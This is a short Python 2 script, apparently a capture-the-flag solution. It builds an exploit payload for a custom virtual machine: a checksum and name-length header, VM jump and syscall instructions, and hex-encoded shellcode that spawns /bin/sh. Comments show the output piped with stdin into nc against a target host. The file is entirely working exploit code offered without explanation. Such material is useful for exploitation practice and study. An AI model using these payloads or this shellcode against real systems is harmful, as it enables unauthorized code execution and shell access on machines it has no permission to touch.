from struct import pack, unpack

# python gen.py > INP
# cat INP /dev/stdin | nc ...

checksum = '2A5F006A'
namelen = 'FF'

shellcode = '01608FE216FF2FE1404078440C30494052400B2701DF012701DF2F2F62696E2F2F7368'

name = ''.join([
    'EA6B0100', #4) Native jump to
    '00000000', #Padding
    '0B50',     #1) VM jump to
    '0800FDEF', #2)  VM_MOVI R_0, 0xEFFD
    '00000000', #3)  VM_SYSCALL

    shellcode   #5) Boom
])

payload = \
    checksum + \
    namelen + \
    name

print 1
print 1
print 1
print payload
